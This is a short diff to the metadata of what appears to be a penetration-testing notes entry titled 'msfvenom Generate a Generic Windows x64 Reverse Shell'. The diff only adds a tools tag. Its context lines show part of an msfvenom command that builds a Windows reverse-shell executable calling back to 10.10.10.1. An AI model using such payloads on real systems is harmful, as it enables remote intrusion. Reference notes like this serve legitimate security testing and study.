@@ -21,6 +21,8 @@ output: 'root@kali:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.1
   Saved as: program.exe'
 created_at: '2020-03-30T21:59:32.816939+00:00'
 updated_at: '2023-05-29T16:48:52.884824+00:00'
+tools:
+- '[[msfvenom]]'
 ---
 
 # msfvenom Generate a Generic Windows x64 Reverse Shell
